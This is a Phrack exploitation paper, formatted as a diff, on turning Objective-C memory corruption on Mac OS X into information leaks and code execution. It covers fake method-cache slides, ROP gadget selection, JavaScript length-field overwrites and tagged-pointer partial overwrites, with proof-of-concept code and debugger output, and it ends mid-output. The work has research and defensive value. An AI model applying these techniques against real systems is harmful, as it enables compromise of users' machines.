@@ -1,0 +1,1467 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0f, Issue 0x45, Phile #0x09 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=-----------=[ Modern Objective-C Exploitation Techniques ]=------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------------------=[ by nemo ]=------------------------------=|
+|=-----------------------=[ nemo@felinemenace.org ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Introduction
+
+Hello again reader. Over the years the exploitation process has obviously
+shifted in complexity. What once began with the straight forward case of
+turning a single bug into a reliable exploit has now evolved more towards
+combining vulnerability primitives together in an attempt to bypass each
+of the memory protection hurdles present on a modern day operating system.
+
+With this in mind, let's jump once again into the exploitation of
+Objective-C based memory corruption vulnerabilities in a modern time.
+Back in Phrack 0x42 (Phile #0x04) I wrote a paper documenting a way to turn
+the most common Objective-C memory corruption primitive (an attacker
+controlled Objective-C method call) into control of EIP. If you have not
+read this paper, or if it's been a while and you need to refresh, it's
+probably wise to do so now, as the first half of this paper will only build
+on the techniques covered in the original [1]. Contrary to the beliefs of
+Ian Beer, the techniques in the original paper are still alive and kicking
+in modern times however some adjustment is needed depending on the context
+of the vulnerability.
+
+--[ Dangling Objective-C Method Calls
+
+As you're aware since you read my paper in [1], Objective-C method calls
+are implemented by passing "messages" to the receiver (object) via the
+objc_msgSend() API call.
+When Objective-C objects are allocated, storage for their instance
+variables is allocated on the native heap with malloc(). The first element
+in this space is a pointer to the class definition in the binary. This is
+typically referred to as the "ISA" pointer. As in: "an NSString 'IS-A'
+NSObject".
+
+When dealing with bugs in Objective-C applications it is extremely common
+for this ISA pointer to be attacker controlled, resulting in an Objective-C
+method call to be performed on an attacker controlled memory location.
+This can occur when dealing with Use-After-Free conditions, heap overflows
+into objective-c objects, and even format bugs using the %@ format string
+character.
+
+In my original paper [1] I wrote about how to utilize this construct to
+perform a successful cache lookup for the selector value, resulting in
+control of EIP. An alternative route to gain EIP control is to make the
+Objective-C runtime think that it's finished looking through the entire
+cache and found no match for the SEL value passed in. In which case the
+runtime will attempt to resolve the method's address via the class
+definition (through the controlled ISA pointer) and once again use an EIP
+value from memory controlled by us. This method is longer however, and adds
+little benefit. But i digress, both of these methods are still completely
+valid in the most current version of Mac OS X at this time Mavericks,
+(10.10).
+
+While, at the time of the Phrack 0x42 release, this technique was fairly
+useful by itself, in modern times EIP/RIP control is only a small victory
+and in no way wins the battle of process control. This is due to the fact
+that even with direct control of EIP modern NX and ASLR makes it difficult
+to know a reliable absolute location in which we can store a payload and
+return to execute it.
+
+From what i've seen, the most commonly used technique to bypass this
+currently is to combine an EIP control primitive with an information leak
+of a .text address in order to construct a ROP chain (returning repeatedly
+into the text segment) which either executes the needed functionality,
+mprotect()'s some shellcode before executing it, or loads an existing
+executable or shared library.
+
+Under the right conditions, it is possible to skip some of these steps
+and turn a dangling Objective-C method call into both an information leak
+and execution control.
+
+In order to use this technique, we must first know the exact binary version
+in use on the target. Thankfully on Mac OS X this is usually pretty easy as
+automatic updates mean that most people are running the same binary
+version.
+
+The specifics of the technique differ depending on the architecture of the
+target system, as well as the location of the particular SEL string which
+is used in the dangling method call construct.
+
+Since we are already familiar with 32-bit internals, we will begin our
+investigation of dangling objc_msgSend() exploitation with the 32-bit
+runtime, before moving on to look at the changes in the new run-time on
+64-bit.
+
+--[ 32-bit dangling objc_msgSend()
+
+Firstly, 32-bit processes utilize the old Objective-C runtime, so the
+specifics of the internals are identical to what is documented in my
+original paper. However, depending on the location of the module
+containing the selector string, the technique varies slightly.
+
+----[ 32-bit Shared Region
+
+The shared-region is a mapping which is common to all processes on the
+system. The file '/var/db/dyld/dyld_shared_cache_i386' is mapped into this
+space. This file is generated by the "update_dyld_shared_cache" utility
+during system update, and contains a large selection of libraries which are
+commonly used on the system. The .paths files in
+"/var/db/dyld/shared_region_roots" dictate which files are contained
+within. The order in which each library is added to this file is
+randomized, therefore the offset into the file for a particular library
+cannot be relied on. Reading the file
+'/var/db/dyld/dyld_shared_cache_i386.map' shows the order of these files.
+
+For 32-bit processes, this file is mapped at the fixed address 0x90000000.
+At this location there is a structure which described the contents of the
+shared region.
+
+This technique, once again, revolves around the ability to control the ISA
+pointer, and to point it at a fake class struct in memory. In order to
+demonstrate how this works, a small sample Objective-C class was created
+(shown below). The complete example of this technique is included at the
+end of this paper in the uuencoded files blob.
+
+        [leakme.m]
+
+        #import "leakme.h"
+
+        @implementation leakme
+        -(void) log
+        {
+            printf("lol\n");
+        }
+        @end
+
+In main.m, we create an instance of this object, and then use sprintf() to
+write out a string representation of the objects address, before converting
+it back with atol(). This is pretty confusing, but it's basically an easy
+way to trick the compiler into giving us a void pointer to the object. Type
+casting the object pointer directly will not compile with gcc.
+
+        printf("[+] Class @ 0x%lx\n",l);
+        sprintf(num,"%li",l);
+        long *ptr = atol(num);
+        ...
+        printf("[+] Overwriting object\n");
+        *ptr = &fc; // isa ptr
+
+By overwriting the ISA pointer with the address of an allocation we
+control, we can easily simulate a vulnerable scenario. Obviously in the
+real world things are not that easy. We need to know the address of an
+allocation which we control. There are a variety of ways this can be
+accomplished. Some examples of these are:
+
+- Using a leak to read a pointer out of memory.
+- Abusing language weaknesses to infer an address. [2]
+- Abuse the predictable nature of large allocations.
+
+However, these concepts are the topic of many other discussions and not
+relevant to this particular technique.
+
+As a quick refresher, the first thing the Objective-C runtime does when
+attempting to call a method for an object (objc_msgSend()) is to retrieve
+the location of the method cache for the object. This is done by
+offsetting the ISA pointer by 0x20 and reading the pointer at this
+location. To control this cache pointer we use the following structure:
+
+        struct fakecache {
+            char pad[0x20];
+            long cache_ptr;
+        };
+
+In the example code we use a separate allocation for the fakecache struct
+and the cache itself. However in a real scenario the address of the cache
+itself would most likely be the same address as the fakecache offset by
+0x24. This would allow us to use a single allocation, and therefore a
+single address, reducing the constraints of the exploit. Also, in a real
+world case we could leak the address of the cache_ptr, then subtract 0x20
+from it's address. This would allow us to shave 0x20 bytes off of the
+buffer we need to control.
+
+Next, objc_msgSend() traverses the cache looking for a cached method call
+matching the desired implementation. This is done by iterating through a
+series of pointers to cache entries. Each entry contains a SEL which
+matches the cached method SEL in the .text segment of the Objective-C
+binary. By comparing this SEL value with the SEL value passed to
+objc_msgSend() the matching entry can be located and used. Rather than
+iterating through every pointer to find the appropriate cache entry each
+time however, a mask is applied to the selector pointer. The masked off
+bits are then shifted and used as an index into the cache table entry
+pointer array. Then after this index is used, each entry is inspected.
+This means that multiple entries can have the same index, however it
+greatly reduces the search time of the cache. Controlling the mask provides
+us with the mechanism we need to create a leak.
+
+Ok, so going back to the mask. In my original Objective-C paper, we set the
+mask to 0. This forced the runtime to look directly past the mask
+regardless of what value the SEL had. In this case however, we want to
+abuse the mask in order to isolate the "randomized" unpredictable bits in
+the selector pointer value (SEL).
+
+Below, we can see a "real" SEL value from a 10.10 system, which is located
+in the shared_region.
+
+        (lldb) x/s $ecx
+        0x90f3f86e: "length"
+
+Since we know that the shared region begins at 0x90000000 we know that
+first octet will always be 0x9. We also know that the offset into the page
+which contains the SEL will always be the same, therefore the last 3
+octets 0x86e will be the same for the binary version we retrieve the SEL
+value from. However, we cannot count on the rest of the SEL value being the
+same on the system we are running our exploit against.
+
+For the value 0x90f3f86e we can see the bit pattern looks as follows:
+
+          9   0    f    3    f     8    6   e
+        1001 0000 1111 0011 1111 1000 0110 1110 : 0x90f3f86e
+
+Based on what we just discussed the mask which would retrieve the bits we
+care about looks as follows:
+
+         0    f    f     f   f     0   0    0
+        0000 1111 1111 1111 1111 0000 0000 0000 : 0x0ffff000
+
+However, since objc_msgSend() shifts the SEL 2 to the right prior to
+applying the mask, we must shift our mask to account for this.
+
+This leaves us with:
+
+         0    3    f    f    f    c    0    0
+        0000 0011 1111 1111 1111 1100 0000 0000 : 0x03fffc00
+
+As you remember, objc_msgSend() applies the following calculation to
+generate the index into the cache entries:
+
+        index = (SEL >> 2) & mask
+
+Filling in the values for this leaves us with an index like:
+
+        index = (0x90f3f86e >> 2) & 0x03fffc00 == 0x3cfc00
+
+This means that for our particular SEL value the runtime will index
+0x3cfc00 * 4 (0xf3f000) bytes forward, and take the bucket pointer from
+this location. It will then dereference the pointer and check for a SEL
+match at that location. By creating a giant cache slide, containing all
+permutations of slide, we can make sure that this location contains the
+right value for slide.
+
+In the 32-bit runtime (the old runtime) the cache index is used to retrieve
+a pointer to a cache_entry from an array of pointers. (buckets).
+In our example code (main.m) we set the buckets array up as follows:
+
+        long *buckets = malloc((CACHESIZE + 1) * sizeof(void *));
+
+However, in a typical exploitation scenario, this array would be part of
+the single large allocation which we control.
+
+For each of the buckets pointers, a cache entry must be allocated. In the
+example code we can use the following struct for each of these entries:
+
+        struct cacheentry {
+                long sel;
+                long pad;
+                long eip;
+        };
+
+
+Each of these structures must be populated with a different SEL and EIP
+value depending on its index into the table. For each of the possible
+index values, we add the (unshifted) randomized bits to the SEL base.
+This way the appropriate SEL is guaranteed to match after the mask is
+applied and used to index the table.
+
+For the EIP value, we can utilize the fact that the string table containing
+the SEL string is always going to be relative to the .text segment within
+the same binary. The diagram below shows this more clearly.
+
+        ,_______________,<--- Mach-O base address
+        |               |
+        | mach-o header |
+        +---------------+
+        |               |<--- SEL in string table, relative to base
+        | string table  |    /\ Relative offset
+        +---------------+    \/ from SEL to ROP gadgets
+        |               |<--- ROP gadget in .text segment
+        | .text segment |
+        '---------------'
+
+For each possible entry in the table, the EIP value must be set to the
+appropriate address relative to the SEL value used. The quickest way i know
+to calculate these values is to break on the objc_msgSend function and dump
+the current SEL value. In lldb this is simple a case of using "reg read
+ecx". Next, "target module list -a $ecx" provides us with the module base.
+By subtracting the absolute SEL address from the module base we can get the
+relative offset within the module. This can be repeated for the gadget
+address within the same module. Next, when populating the table, we simple
+need to add these two relative offsets to our potential module base
+candidate. We increment the module base candidate for each entry in the
+table.
+
+By populating our cache slide in this way we are guaranteed the execution
+of a single ROP gadget within the module that our SEL is in. This can be
+enough for us to succeed. We will look into ways to use this construct
+later.
+
+Obviously the allocation used for this 32-bit technique is very large. To
+calculate the size of the cache slide which we need to generate we need to
+look at the size of the shared region. The shared region always starts at
+0x90000000, but the first module inside the shared region starts at
+0x90008000. The end of the shared region depends on the number of modules
+loaded in the shared region. On the latest version of Mac OS X at this
+time, the end of the shared region is located at 0x9c391000. The bit
+patterns for these are shown below.
+
+10010000 00000000 10000000 00000000 :: SR START -- 0x90008000
+10011100 00111001 00010000 00000000 :: SR END   -- 0x9C391000
+
+00001111 11111111 11110000 00000000 :: MASK UNSHIFTED
+
+If we compare this to the unshifted mask, and mask off the bits we care
+about we get the following values for our potential index values.
+
+00000000 00000000 00100000 00000000  -- smallest index value - 0x2000
+00000011 00001110 01000100 00000000  -- biggest  index value - 0x30E4400
+
+Since the buckets array is an array of 4 byte pointer values we can
+multiple the largest index by 4, giving us 0xc391000. Each cache entry
+pointed to by a bucket is 12 bytes in size. This means that the size of the
+cache entry array is 0x24ab3000.
+
+By adding these two values together we get the total size of our cache
+slide, 0x30e44000 bytes.
+
+Allocations of this size can be difficult to make depending on the target
+application. However, also due to the size, they are predictably placed
+within the address space. This buffer can be made from JavaScript for
+example.
+
+----[ Uncommon 32-bit Libraries
+
+Libraries which are not contained within the shared region are mapped in by
+the linker when an executable is loaded that requires them as a dependency.
+
+The location of these modules is always relative to the end of the
+executable file and is loaded in the order specified in the LC_LOAD_DYLIB
+header.
+
+When loading the executable file, the kernel generates a randomized slide
+value for ASLR. This value is added to the desired segment load addresses
+in the executable (if it's compiled with PIE) and then the executable is
+re-based to that location.
+
+        uintptr_t requestedLoadAddress = segPreferredLoadAddress(i) +
+            slide;
+
+The slide value is calculated by the kernel and then passed to the main
+function of the dynamic loader. The following algorithm is responsible for
+generating the slide value.
+
+        aslr_offset = (unsigned int)random();
+        max_slide_pages = vm_map_get_max_aslr_slide_pages(map);
+        aslr_offset %= max_slide_pages;
+        aslr_offset <<= vm_map_page_shift(map);
+
+where:
+
+        uint64_t
+        vm_map_get_max_aslr_slide_pages(vm_map_t map)
+        {
+                return (1 << (vm_map_is_64bit(map) ? 16 : 8));
+        }
+
+
+        int
+        vm_map_page_shift(
+                vm_map_t map)
+        {
+                return VM_MAP_PAGE_SHIFT(map);
+        }
+
+        #define VM_MAP_PAGE_SHIFT(map) \
+            ((map) ? (map)->hdr.page_shift : PAGE_SHIFT)
+        #define PAGE_SHIFT I386_PGSHIFT
+        #define I386_PGSHIFT 12
+
+So for example, a random() value of 0xdeadbeef, would end up as the value
+0xef000. With the following calculation:
+
+        slide = ((0xdeadbeef % (1<<8)) << 12)
+        slide = 0xef000
+
+The gcc compiler and llvm both (by default) use a load address of 0x1000
+for the text section of an executable. So for the slide value 0xef000 the
+executable file would be based at 0x1000 + 0xef000 = 0xf0000.
+
+This means that for the most part, you're dealing with roughly 1 byte of
+unpredictable bits. Depending on the number of libraries loaded which are
+outside of the shared region, this fluctuates, however libraries are always
+loaded in the order stipulated by the executable itself, so this is fairly
+predictable.
+
+For our dangling objc_msgSend technique this means that our mask fluctuates
+depending on the target. In the best case, masking of the single byte in
+the address can be achieved by using the mask (0x000ff000 >> 2) == 0x3fc00.
+
+--[ 64-bit dangling objc_msgSend()
+
+The 64-bit version of this technique is quite different to it's 32-bit
+brethren. This is mostly due to the fact that 64-bit processes use a
+brethren. This is mostly due to the fact that 64-bit processes use a
+whole new version of the runtime.
+
+In the new runtime, the objc_class structure is no longer a basic C
+structure. Instead it uses C++ intrinsics to include methods.
+
+The memory footprint for the new class is shown below.
+
+struct objc_class : objc_object {
+    // Class ISA;
+    Class superclass;
+    cache_t cache;             // formerly cache pointer and vtable
+    class_data_bits_t bits;    // class_rw_t * plus custom rr/alloc flags
+...
+}
+
+The cache_t struct looks as follows:
+
+struct cache_t {
+    struct bucket_t *_buckets;
+    mask_t _mask;
+    mask_t _occupied;
+...
+}
+
+and a bucket_t struct looks like:
+
+struct bucket_t {
+private:
+    cache_key_t _key;
+    IMP _imp;
+...
+}
+
+Putting this together. The main thing that has changed regarding the cache
+lookup, rather than an array of pointers to cache entries, there is simply
+a single pointer to an array of SEL + method address entries at offset 0x10
+into the structure. Following this, there's the mask, followed by an
+occupied field indicating that entries in the cache exist.
+
+The critical difference in the run-time is the way the mask is used to
+index into this table. Rather than the (SEL >> 2) value in the 32-bit
+runtime, the index is calculated via ((SEL & mask) << 4). This means, if we
+were to abuse the mask in a similar way to the 32-bit technique we would
+need a mask of 0xffff0000 in order to isolate the randomized bits.
+Obviously even if we were able to make an allocation big enough to contain
+the cache slide necessary for this it would be such a time consuming act to
+populate 4gb worth of cache entries to catch the index that this is not
+really a feasible process.
+
+Instead we must utilize an additional characteristic of the new runtime.
+The objc_msgSend() call at a high level looks as follows:
+
+        ISA = *class_ptr;
+        offset = ((SEL & ISA->mask) << 4);
+
+        while(ISA->buckets[offset].SEL != 0) {
+                if(ISA->buckets[offset].SEL == SEL) {
+                        return ISA->buckets[offset].method(args);
+                } else {
+                        offset--;
+                        continue;
+                }
+        }
+
+This means that if we once again create a large slide containing entries
+for all possible randomized bits, we simply need to point (using the index
+we control) the runtime to end of our slide, and let it walk backwards
+until it finds a match.
+
+----[ 64-bit Shared Region
+
+In order to investigate this technique, we will begin again by looking at
+the shared region on 64-bit processes. The shared region starts at the
+address 0x7FFF80000000. Once again a cache file is mapped in, this time
+from /var/db/dyld/dyld_shared_cache_x86_64. This file is, once again,
+randomized upon creation, however in 64-bit processes there is also a
+random slide added to the file when it is mapped in. This is calculated
+using sizeof(shared_region) - sizeof(cache file) as the max. As far as our
+technique goes however this does not really change very much.
+
+Calculating the mask value for this technique can be challenging. There are
+a few constraints which we must work against in order to index our bucket
+list to the last entry.
+
+To investigate this we will take a typical SEL value 0x00007fff99f88447
+The bit pattern is broke down below.
+
+SEL:
+ 0x00       00       7f       ff       99       f8       84       47
+00000000 00000000 01111111 11111111 10011001 11111000 10000100 01000111
+
+Unfortunately the mask variable is only 4 bytes long. This means that the
+predictable bits in the upper 32-bits of the SEL are not available to us.
+Also, the last 12 static bits (offset into page - 0x447) would result in an
+index that is too small. If we used those bits we would not have a large
+enough offset to index to the end of the slide. Luckily, we have one single
+static bit in position 33 which we can count on being set. We can take
+advantage of this bit with the following mask.
+
+Mask:
+ 0x00       00       00       00       80       00       00       00
+00000000 00000000 00000000 00000000 10000000 00000000 00000000 00000000
+
+Applying this bit to any SEL value within the shared region will guarantee
+the offset 0x80000000. Clearly this value is way beyond the end of our
+required slide, however since we also control the pointer to the bucket
+slide, we can subtract (0x80000000 - sizeof(cache)) from the pointer value
+to force it to point to the right location.
+
+The example code main64.m demonstrates this technique. In this code, we use
+a fakecache structure to control the initial cache lookup. A pad is used to
+correctly position the bucket pointer and mask.
+
+        struct fakecache {
+           char pad[0x10];
+           long bucketptr;
+           long mask;
+        };
+
+Next, we allocate an array of cache entry structs in order to hold our SEL
+slide. Obviously in a real attack all these elements would be in a single
+allocation, however for this example we will split them up for clarity.
+
+        struct cacheentry {
+                long sel;
+                long rip;
+        };
+
+        struct cacheentry *buckets = malloc((NUMBUCKETS+1) * sizeof(struct
+        cacheentry));
+
+Initializing each of these elements is simply a case of incrementing the
+random value added to the SEL each time, and populating each entry.
+
+Again, the RIP value is calculated by adding a relative offset to the SEL
+in order to locate our ROP gadget.
+
+        for(slide = 0; slide < NUMBUCKETS ; slide++) {
+                buckets[slide].sel = BASESEL + (slide * 0x1000);
+                buckets[slide].rip = buckets[slide].sel - 75654446;
+        }
+
+----[ Uncommon 64-bit Libraries
+
+Once again, libraries which are not within the shared region are mapped
+directly after the executable image in memory. Typically the text segment
+address generated by the compiler is 0x100000000.
+
+The same code is used to to generate the slide that we looked at earlier in
+the 32-bit section. Here is an example of a slide for a 64-bit process with
+the random() value of 0xdeadbeef.
+
+        slide         = ((0xdeadbeef % (1<<16)) << 12)
+        slide         = 0xbeef000
+        example SEL   = 0x10beef447
+
+As you can see, in this example, there is no predictable bit in the lower
+32-bits of the SEL which we can rely on to index to the end of our table.
+Our only option here is to utilize the random bits in the SEL. We can do
+this by repeating the entire spectrum of randomized values in our slide
+multiple times. This way depending on the value of the random bits a
+different offset will occur into the slide, however in most scenarios it
+will result in finding one instance of the correct entry.
+
+--[ Single Gadget Exploitation Strategies
+
+Now that we've looked at how to get execution to a predictable location of
+our choice, the next step is to look at some ways to utilize this to our
+advantage.
+
+Obviously there is an abundance of ways that this can be utilized, but the
+following 3 methods are ways that I have seen succeed in real life.
+
+----[ Return SEL Gadget
+
+At the moment when we gain execution control using this technique a
+register value contains the SEL pointer value. We can use this fact to our
+advantage. For example, for 32-bit code, the following gadget could take
+advantage of this.
+
+                00000000  89C8              mov eax,ecx
+                00000002  5E                pop esi
+                00000003  5D                pop ebp
+                00000004  C3                ret
+
+The gadget above moves the SEL pointer value into the eax register,
+obviously on function return this register is treated as the return value.
+Next it restores EBP from the stack and uses the ret instruction to return
+from the function. This results in, rather than the expected return value
+for whatever Objective-C method was dangling, the SEL value is returned.
+
+This is only a useful approach if we are able to retrieve the value from
+this context and utilize it to re-trigger the bug. In the example code
+provided, the use of this gadget causes the SEL value to be printed, rather
+than the length of the NSString which is intended. You can see the result
+of this below.
+
+        -[nemo@objcbox:code]$ ./leak
+        [+] buckets is 0x10000000 size.
+        [+] cacheentry is 0x30000000 size.
+        [+] Setting up buckets
+        [+] Done
+        [+] Class @ 0x78622240
+        [+] Overwriting object
+        [+] Calling method
+        String length: 0x93371b88
+
+Likewise, in some cases it may not make sense to return the SEL directly.
+If it is not possible to retrieve the leaked value upon return it may make
+more sense to execute a gadget which writes ecx somewhere in memory. For
+example in a web browser context, writing the ecx register into a
+JavaScript array which is attacker controlled may result in the ability to
+"collect" this value from JavaScript context and re-trigger the bug.
+
+----[ Self Modifying ROP
+
+Another potential use of the single gadget execution primitive is to use
+the ecx register containing SEL to modify the rest of a ROP chain prior to
+pivoting to use it.
+
+I have never personally been successful with this, however I have seen this
+done in a friends exploit.
+
+Finding a gadget which accomplishes all this is extremely challenging.
+
+----[ Arbitrary Write Gadget
+
+The final method for using a single gadget to continue the exploitation
+process is to turn the execution primitive into an arbitrary write
+primitive.
+
+It is usually fairly straight forward to find a gadget which allows you to
+write any high value to a fixed location. By positioning something at this
+location (eg 0x0d0d0d0d) this single write can be leveraged to escalate the
+available functionality. For example, in a web context. Positioning a
+JavaScript array or string at this location then writing to the length
+field can be enough to gain an arbitrary read/write primitive from
+JavaScript. This is easily enough to finish the exploitation process.
+
+Outside of the browser context there are still a variety of length encoded
+data types which can be used for this. Specifically to Objective-C, the
+NSMutableArray/NSArray classes work this way.
+
+--[ Tagged Pointers
+
+One of the new features added to the Objective-C runtime is the usage of
+"tagged pointers" to conserve resources. Tagged pointers take advantage of
+the fact that the system memory allocator will align pointers handed out on
+natural alignment boundaries. This means that the low bit will never be
+set.
+
+        (lldb) print (long)malloc_good_size(1)
+        (long) $0 = 16
+
+The runtime takes advantage of this lower bit in order to indicate that the
+pointer value is not to be treated as a regular pointer, and instead, bits
+61-63 are used as an index into a table of potential ISA pointers,
+registered with the system. This means the first 60 bits can then by used
+to store the object payload itself inline.
+
+        Tagged pointer layout
+
+11111111 11111111 11111111 11111111 11111111 11111111 11111111 1111[111][1]
+                                                                     |   |
+                                                                     |  tag
+                                                                   index
+
+As mentioned, index bits index into a table of potential object types. The
+default types registered with the runtime is shown below.
+
+    OBJC_TAG_NSAtom            = 0,
+    OBJC_TAG_1                 = 1,
+    OBJC_TAG_NSString          = 2,
+    OBJC_TAG_NSNumber          = 3,
+    OBJC_TAG_NSIndexPath       = 4,
+    OBJC_TAG_NSManagedObjectID = 5,
+    OBJC_TAG_NSDate            = 6,
+    OBJC_TAG_7                 = 7
+
+It is possible for a developer to add their own types to the table, however
+it is very uncommon for anyone to do this. The guide at [3] clearly
+illustrates the mechanics of tagged pointers, if you require more
+information.
+
+Now that we've looked at how tagged pointers work, we will investigate some
+of them from an exploitation perspective.
+
+----[ Tagged NSAtom
+
+NSAtom is an extremely handy object type for exploitation. In order to use
+a tagged NSAtom, we simply need the low bit set indicating a tagged
+pointer, and then no bits set in the index bits. The value 0x1 by itself
+for example will satisfy this. The beautiful thing about the NSAtom class
+is that calling any method name on this class will result in success.
+
+The example code below simply calls the method initWithUTF8String on the
+object 0x1. Clearly this is not a valid pointer, and instead is treated as
+an NSAtom. Any method name could be used and the result would still be 1.
+
+int main(int argc, const char * argv[])
+{
+        printf("[+] NSAtom returned: %u\n",[1 initWithUTF8String:"lol"]);
+        return 0;
+}
+
+$ ./nsatom
+[+] NSAtom returned: 1
+
+As you can imagine, this behavior can be extremely useful for
+CoE or general exploitation. An example scenario would be, if you are
+forced to write through several Objective-C object pointers on the path to
+an overwrite target, any method call on those objects would require valid
+pointers/fake object setup. However with the NSAtom tagged pointer type,
+simply replacing these pointers with the value 0x1 can be enough to stop
+the crash and take advantage of the overwrite target.
+
+Also, in extremely specific cases, the fact that this object returns true
+can be used to manipulate the path of the program.
+
+----[ Tagged NSString
+
+The next tagged pointer type we will investigate is the tagged NSString.
+With the new runtime, when a NSString is created, the size of the string
+during initialization dictates the type of storage for the string.
+
+String which are greater than 7 bytes in length are stored on the heap in a
+typical Objective-C NSString object. However, for strings of 7-bytes or
+less, a tagged pointer with the index 2 is used. The bitpattern for a
+tagged NSString is shown below. It is comprised of 7 bytes of string data,
+followed by 4 bits for the length, 3-bit for the index into the tagged
+pointer types array and finally the low bit to indicate tagged pointer
+type.
+
+<-------------------[ String Data ]-------------------->
+11111111111111111111111111111111111111111111111111111111[1111][010][1]
+                                                [strlen]<---->  |   |
+                                                                |  tag
+                                                         index: 02
+
+The first scenario in which we can abuse the properties of a tagged
+NSString is a partial overwrite into an untagged NSString. The example code
+included with this paper (nsstring1.m) demonstrates this.
+
+In this code (shown below) we create an NSString (s) using the C string
+contents "thisisaverylongstringnottagged". Since this is not 7 or less
+bytes in length this string is stored on the heap, and the object pointer
+points to this.
+
+We use the character pointer (ptr) to simulate a 1 byte write into the
+least significant byte of the object pointer. This condition can occur from
+either a controlled overflow, or an actual 1 byte off-by-one.
+
+We write the value 0xf5 to this byte, and then print the length and
+contents of the string.
+
+int main(int argc, const char * argv[])
+{
+        NSString *s = [[NSString alloc]
+initWithUTF8String:"thisisaverylongstringnottagged"];
+        char *ptr = (char *)&s;
+        *ptr = 0xf5; // NSString Tagged
+
+        printf("[+] NSString @ 0x%lx\n",(unsigned long)s);
+        printf("[+] String length: 0x%lx\n",(unsigned long)[s length]);
+        NSLog(@"%@",s);
+
+        return 0;
+}
+
+The value 0xf5 in the least significant byte has the following bit pattern:
+
+        [1111][010][1]
+
+As you can see, this leaves us with a string length of 0xf, an index of 0x2
+and the LSB set to indicate a tagged pointer.
+
+By only using a partial overwrite, we have left the first 7 bytes of the
+pointer untouched.
+
+As you can see from the output below, the length of the string is 0xf (15)
+after this overwrite. This means that when the NSLog() attempts to print
+the string contents, 15 bytes of data are pulled out starting from the
+inline data. This leaks the address of the object. If our target allows us
+to retrieve a string value and use it, we can turn a one byte overwrite
+into an info leak primitive.
+
+        $ ./nsstring1
+        [+] NSString @ 0x7fc0db4116f5
+        [+] String length: 0xf
+        2015-04-04 07:47:26.815 nsstring1[13335:92489992] eeeeeee 3eIjuaj
+
+
+The next scenario which we will investigate involves overflowing into a
+tagged NSString, rather than an un-tagged variant. The example code
+nsstring2.m demonstrates this.
+
+In this code, we initialize an NSString with the contents "AAAAAAA". Since
+this is only 7 bytes of c-string it guarantees that the NSString will be a
+tagged type. This means it will contain the value:
+
+        0x4141414141414175
+
+Essentially the first 7 bytes are taken up with our "A" contents. The last
+byte contains the length (7) followed by the bitpattern to indicate
+NSString type of tagged pointer.
+
+Next, we once again simulate a single byte overflow into the object
+pointer. This time we write the value 0x00, which is a common primitive in
+real life due to off-by-one string operations. This forcefully unsets the
+tagged LSB in the pointer, turning the tagged string into an un-tagged
+type.
+
+Finally we call the length method on the object.
+
+int main(int argc, const char * argv[])
+{
+        NSString *s = [[NSString alloc] initWithUTF8String:"AAAAAAA"];
+        char *ptr = (char *)&s;
+        *ptr = 0x00; // un-tag
+
+        printf("[+] NSString @ 0x%lx\n",(unsigned long)s);
+        printf("[+] String length: 0x%lx\n",(unsigned long)[s length]);
+        NSLog(@"%@",s);
+
+        return 0;
+}
+
+As you can imagine, the runtime now treats our tagged object as untagged.
+This means that the tagged pointer is now treated as a real pointer. If we
+were able to control the contents of the NSString on initialization, this
+would present us with direct control over the object cache lookup, allowing
+us to use the construct presented earlier in the paper to turn this into
+code execution.
+
+(lldb) r
+Process 13636 launched: './nsstring2' (x86_64)
+[+] NSString @ 0x4141414141414100
+Process 13636 stopped
+* thread #1: tid = 0x5834fc3, 0x00007fff96c210d7
+  libobjc.A.dylib`objc_msgSend + 23, queue = 'com.apple.main-thread', stop
+reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+    frame #0: 0x00007fff96c210d7 libobjc.A.dylib`objc_msgSend + 23
+libobjc.A.dylib`objc_msgSend + 23:
+-> 0x7fff96c210d7:  andq   (%rdi), %r11
+   0x7fff96c210da:  movq   %rsi, %r10
+   0x7fff96c210dd:  andl   0x18(%r11), %r10d
+   0x7fff96c210e1:  shlq   $0x4, %r10
+(lldb) reg read rdi
+     rdi = 0x4141414141414100
+
+----[ Tagged NSNumber
+
+As you can imagine, the NSNumber case is very similar to that of the
+NSString. Any number value which can be contained in the first 7 bytes of
+the pointer is stores inline as a tagged NSNumber, rather than performing
+an allocation and storing the number on the heap.
+
+The sample code nsnumber1.c demonstrates,once again, a single byte
+overwrite into a tagged pointer, containing an inline nsnumber.
+
+In this code, we begin by instantiating an NSNumber containing the value
+0xdeadbeeffeedface. The contents of this number are unimportant, however
+clearly the number is large enough that it would not fit into the upper
+bytes of a tagged pointer, therefore this NSNumber is stored on the heap in
+typical Objective-C fashion.
+
+Next, we write the value 0xf7 to the lower byte of the object pointer. Once
+again this converts the un-tagged object pointer into a tagged type, while
+leaving the upper bits in-tact. Finally, we log the contents of the number
+using the method unsignedLongLongValue.
+
+int main(int argc, const char * argv[])
+{
+        NSNumber *n = [NSNumber numberWithInteger:0xdeadbeeffeedface];
+        char *ptr = (char *)&n;
+        *ptr = 0xf7;
+
+        NSLog(@"0x%lx\n",(unsigned long)[n unsignedLongLongValue]);
+        return 0;
+}
+
+As you can see from the output below, rather than printing the initialized
+contents (0xdeadbeeffeedface) the NSLog call displays the object pointer
+value itself, once again creating an information leak of this value.
+
+$ ./nsnumber1
+2015-04-04 09:26:58.701 nsnumber1[14663:92514549] 0x7fd6134116
+
+The final tagged pointer example nsnumber2.m demonstrates the counter case
+to this. In this code an NSNumber is instantiated containing the value
+0x0041414141414141. As you can see from the leading NULL byte, this value
+is small enough that it fits within the first 7 bytes of the object
+pointer. Therefore, this object is created as a tagged pointer with the
+value:
+
+        0x4141414141414107
+
+We once again truncate the final byte using a character pointer, removing
+the tagged bit before calling a method on it (unsignedLongLongValue).
+
+int main(int argc, const char * argv[])
+{
+        NSNumber *n = [NSNumber numberWithInteger:0x0041414141414141];
+        char *ptr = (char *)&n;
+        *ptr = 0x00;
+
+        NSLog(@"0x%lx\n",(unsigned long)[n unsignedLongLongValue]);
+        return 0;
+}
+
+When the method call is made, the runtime treats the numbers contents as a
+pointer, and leaves us with a dangling Objective-C message send call, which
+we can once again abuse to control execution.
+
+Process 14636 launched: './nsnumber2' (x86_64)
+Process 14636 stopped
+* thread #1: tid = 0x583a67f, 0x00007fff96c210d7
+  libobjc.A.dylib`objc_msgSend + 23, queue = 'com.apple.main-thread', stop
+reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
